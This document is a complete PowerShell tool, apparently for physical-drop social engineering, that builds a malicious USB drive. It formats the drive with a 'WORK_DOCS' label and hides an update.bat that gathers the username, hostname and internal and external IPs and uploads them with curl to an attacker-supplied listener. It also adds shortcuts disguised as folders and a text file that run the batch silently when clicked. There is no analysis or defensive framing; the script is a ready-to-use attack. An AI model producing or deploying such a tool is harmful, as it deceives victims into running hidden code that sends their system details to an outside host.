param (
    [string]$listenerIP
)

function Show-Help {
    Write-Host "`nUSB Drop Builder Tool"
    Write-Host "Usage: .\usb_drop_builder.ps1 <listener-ip-address>"
    Write-Host "Example: .\usb_drop_builder.ps1 1.2.3.4"
    exit 0
}

if (-not $listenerIP -or $listenerIP -in @('-h', '--help')) {
    Show-Help
}

$removableDisks = Get-PhysicalDisk | Where-Object { $_.BusType -eq 'USB' }
if ($removableDisks.Count -eq 0) {
    Write-Host "`n[-] No USB drives detected." -ForegroundColor Red
    exit 1
}

$driveList = @()
foreach ($disk in $removableDisks) {
    $diskNumber = $disk.FriendlyName
    $partitions = Get-Disk | Where-Object { $_.FriendlyName -eq $diskNumber } | Get-Partition
    foreach ($part in $partitions) {
        $vol = Get-Volume -DriveLetter $part.DriveLetter -ErrorAction SilentlyContinue
        if ($vol) {
            $driveList += $vol
        }
    }
}

if ($driveList.Count -eq 0) {
    Write-Host "`n[-] No mounted USB volumes found." -ForegroundColor Yellow
    exit 1
}

Write-Host "`nSelect a USB drive to format and prepare:`n"
for ($i = 0; $i -lt $driveList.Count; $i++) {
    $v = $driveList[$i]
    Write-Host "[$i] $($v.DriveLetter): $($v.FileSystemLabel) ($([math]::Round($v.SizeRemaining/1GB,2)) GB free)"
}

$choice = Read-Host "`nEnter number of drive to use"
if (-not $choice -or ($choice -notmatch '^\d+$') -or ($choice -ge $driveList.Count)) {
    Write-Host "`n[-] Invalid selection. Aborting." -ForegroundColor Yellow
    exit 1
}

$drive = $driveList[$choice].DriveLetter + ":\"
Format-Volume -DriveLetter $driveList[$choice].DriveLetter -FileSystem FAT32 -NewFileSystemLabel "WORK_DOCS" -Force -Confirm:$false

$dropPath = $drive
$originalLocation = Get-Location
Set-Location $dropPath

$batTemplate = @"
@echo off
set TEMPFILE=%TEMP%\sysinfo.txt

echo [WHOAMI] >> %TEMPFILE%
whoami >> %TEMPFILE%
echo [HOSTNAME] >> %TEMPFILE%
hostname >> %TEMPFILE%
echo [INTERNAL_IP] >> %TEMPFILE%
ipconfig | findstr /i "IPv4" >> %TEMPFILE%
echo [EXTERNAL_IP] >> %TEMPFILE%
curl -s https://ifconfig.me >> %TEMPFILE%

curl -X POST -F "data=@%TEMPFILE%" http://__IP__:8080
del %TEMPFILE%
"@

$batContent = $batTemplate -replace "__IP__", $listenerIP
$batPath = Join-Path $dropPath "update.bat"
$batContent | Out-File -Encoding ASCII -FilePath $batPath
attrib +h $batPath

function New-FakeLink {
    param (
        [string]$name,
        [string]$iconIndex
    )
    $shortcut = "$dropPath\$name.lnk"
    $WScriptShell = New-Object -ComObject WScript.Shell
    $lnk = $WScriptShell.CreateShortcut($shortcut)
    $lnk.TargetPath = "cmd.exe"
    $lnk.Arguments = "/c update.bat"
    $lnk.IconLocation = "C:\Windows\System32\SHELL32.dll,$iconIndex"
    $lnk.WindowStyle = 7
    $lnk.Save()
}

New-FakeLink -name "Client Files" -iconIndex 3
New-FakeLink -name "Corporate" -iconIndex 3
New-FakeLink -name "Personal" -iconIndex 3
New-FakeLink -name "notes.txt" -iconIndex 1

Set-Location $originalLocation
Write-Host "`n[+] USB drop successfully created at $drive"
